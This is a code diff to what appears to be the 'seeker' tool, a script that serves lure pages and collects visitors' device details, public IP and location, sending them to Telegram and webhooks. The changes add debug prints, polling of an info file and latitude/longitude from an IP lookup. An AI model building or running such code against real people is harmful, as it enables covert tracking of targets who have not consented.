@@ -83,6 +83,7 @@ TEMP_KML = f'{path_to_script}/template/sample.kml'
 META_FILE = f'{path_to_script}/metadata.json'
 META_URL = 'https://raw.githubusercontent.com/thewhiteh4t/seeker/master/metadata.json'
 PID_FILE = f'{path_to_script}/pid'
+info_sent = False
 
 if not path.isdir(LOG_DIR):
     mkdir(LOG_DIR)
@@ -152,6 +153,7 @@ def banner():
 
 
 def send_webhook(content, msg_type):
+    #print(" content- " , content)
     if webhook is not None:
         if not webhook.lower().startswith('http://') and not webhook.lower().startswith(
             'https://'
@@ -312,26 +314,50 @@ def server():
 
 
 def wait():
+    global info_sent
+    last_info_mtime = path.getmtime(INFO) if path.exists(INFO) else 0
     printed = False
+    print("printed at wait - " , printed)
+    #info_flag = False
+    print("info sent flag - ",info_sent)
     while True:
         sleep(2)
+        #print("info sent flag - ",info_sent)
+        current_info_mtime = path.getmtime(INFO) if path.exists(INFO) else 0
+       
         size = path.getsize(RESULT)
+        #print("RESULT size - " , size)
+        size2 = path.getsize(INFO)
+        #print("INFO  size -" , size2)
         if size == 0 and printed is False:
             utils.print(f'{G}[+] {C}Waiting for Client...{Y}[ctrl+c to exit]{W}\n')
             printed = True
-        if size > 0:
+        if size > 0 :
+            print("Size of result increased - captured location - ",size)
             data_parser()
             printed = False
+        #elif size2 > 0 and info_sent is False :
+        #    print("Size 2-",size2)
+        #    data_parser()
+        #    printed = False
+        if current_info_mtime != last_info_mtime:
+            print("info.txt modification time changed")
+            data_parser()
+            printed = False
+            last_info_mtime = current_info_mtime
 
 
 def data_parser():
+    global info_sent
     data_row = []
     with open(INFO, 'r') as info_file:
         info_content = info_file.read()
     if not info_content or info_content.strip() == '':
+        print("info empty")
         return
     try:
         info_json = loads(info_content)
+        print("info not empty")
     except decoder.JSONDecodeError:
         utils.print(f'{R}[-] {C}Exception : {R}{traceback.format_exc()}{W}')
     else:
@@ -370,13 +396,16 @@ def data_parser():
 {G}[+] {C}Browser    : {W}{var_browser}
 {G}[+] {C}Public IP  : {W}{var_ip}
 """
+        
         utils.print(device_info)
         send_telegram(info_json, 'device_info')
         send_webhook(info_json, 'device_info')
+        info_sent = True
 
         if ip_address(var_ip).is_private:
             utils.print(f'{Y}[!] Skipping IP recon because IP address is private{W}')
         else:
+            print("Requesting IP - ")
             rqst = requests.get(f'https://ipwhois.app/json/{var_ip}')
             s_code = rqst.status_code
 
@@ -389,9 +418,11 @@ def data_parser():
                 var_city = str(data['city'])
                 var_org = str(data['org'])
                 var_isp = str(data['isp'])
+                var_long = str(data['longitude'])
+                var_lat = str(data['latitude'])
 
                 data_row.extend(
-                    [var_continent, var_country, var_region, var_city, var_org, var_isp]
+                    [var_continent, var_country, var_region, var_city, var_org, var_isp, var_lat, var_long]
                 )
                 ip_info = f"""{Y}[!] IP Information :{W}
 
@@ -401,13 +432,20 @@ def data_parser():
 {G}[+] {C}City      : {W}{var_city}
 {G}[+] {C}Org       : {W}{var_org}
 {G}[+] {C}ISP       : {W}{var_isp}
-"""
+{G}[+] {C}Latitude  : {W}{var_lat}
+{G}[+] {C}Longitude : {W}{var_long}
+""" 
                 utils.print(ip_info)
                 send_telegram(data, 'ip_info')
                 send_webhook(data, 'ip_info')
 
+
     with open(RESULT, 'r') as result_file:
+        print("reading result")
         results = result_file.read()
+        if not results or results.strip() == '':
+            print("result empty")
+            return
         try:
             result_json = loads(results)
         except decoder.JSONDecodeError:
@@ -452,6 +490,7 @@ def data_parser():
                 send_webhook(result_json, 'error')
 
     csvout(data_row)
+    info_sent = False
     clear()
     return
 
@@ -505,6 +544,7 @@ try:
     SITE = template_select(SITE)
     server()
     wait()
+    print("waitloopended")
     data_parser()
 except KeyboardInterrupt:
     utils.print(f'{R}[-] {C}Keyboard Interrupt.{W}')
